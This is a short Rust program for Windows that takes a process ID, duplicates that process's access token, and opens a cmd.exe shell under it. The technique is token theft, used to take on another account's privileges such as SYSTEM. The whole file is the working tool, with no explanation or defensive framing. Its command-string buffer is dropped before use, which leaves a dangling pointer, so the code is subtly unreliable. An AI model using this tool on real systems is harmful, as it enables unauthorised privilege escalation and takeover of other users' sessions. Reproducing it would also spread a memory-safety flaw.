use std::{env, ptr::null_mut};
use windows::{
    core::*,
    Win32::{
        Foundation::*,
        Security::*,
        System::{Console::*, Threading::*},
    },
};

fn main() -> anyhow::Result<()> {
    let arg: Vec<_> = env::args().collect();
    if arg.len() < 2 {
        eprintln!("Usage: {} <process_id>", arg[0]);
        return Ok(());
    }

    let handle = unsafe {
        let pid: u32 = arg[1].parse::<u32>()?;
        OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)?
    };

    let token = {
        let mut token = HANDLE::default();
        unsafe { OpenProcessToken(handle, TOKEN_DUPLICATE, &mut token)? };
        token
    };

    let prim_token = unsafe {
        let mut mtoken = HANDLE::default();
        DuplicateTokenEx(
            token,
            TOKEN_ALL_ACCESS,
            None,
            SecurityAnonymous,
            TokenPrimary,
            &mut mtoken,
        )?;
        mtoken
    };

    let stdin = unsafe { GetStdHandle(STD_INPUT_HANDLE)? };
    let stdout = unsafe { GetStdHandle(STD_OUTPUT_HANDLE)? };
    let stderr = unsafe { GetStdHandle(STD_ERROR_HANDLE)? };
    let lpstartupinfo = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as u32,
        lpReserved: PWSTR::null(),
        lpDesktop: PWSTR::null(),
        lpTitle: PWSTR::null(),
        dwX: 0,
        dwY: 0,
        dwXSize: 0,
        dwYSize: 0,
        dwXCountChars: 0,
        dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: STARTUPINFOW_FLAGS::default(),
        wShowWindow: 0,
        cbReserved2: 0,
        lpReserved2: null_mut(),
        hStdInput: stdin,
        hStdOutput: stdout,
        hStdError: stderr,
    };
    
    let cmd = "C:\\Windows\\System32\\cmd.exe\0"
        .encode_utf16()
        .collect::<Vec<_>>()
        .as_mut_ptr();
    unsafe {
        CreateProcessWithTokenW(
            prim_token,
            LOGON_WITH_PROFILE,
            None,
            PWSTR::from_raw(cmd),
            CREATE_NEW_CONSOLE,
            None,
            None,
            &lpstartupinfo,
            &mut PROCESS_INFORMATION::default(),
        )?
    };

    
    unsafe {
        CloseHandle(handle)?;
        CloseHandle(token)?;
        CloseHandle(prim_token)?;
    };

    Ok(())
}
